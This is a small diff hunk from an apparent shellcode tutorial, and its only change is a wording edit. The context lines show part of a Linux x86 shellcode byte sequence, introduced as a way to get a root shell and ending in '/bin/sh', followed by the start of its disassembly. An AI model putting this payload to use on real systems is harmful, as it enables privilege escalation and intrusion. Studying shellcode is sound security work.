@@ -6,7 +6,7 @@ With the following machine code we can get a root shell:
 CD 80 31 DB 89 D8 40 CD 80 E8 DC FF FF FF 2F 62
 69 6E 2F 73 68
 
-And the asm code:
+And its asm code:
 
 seg000:00000000 loc_0:
 seg000:00000000         xor     eax, eax
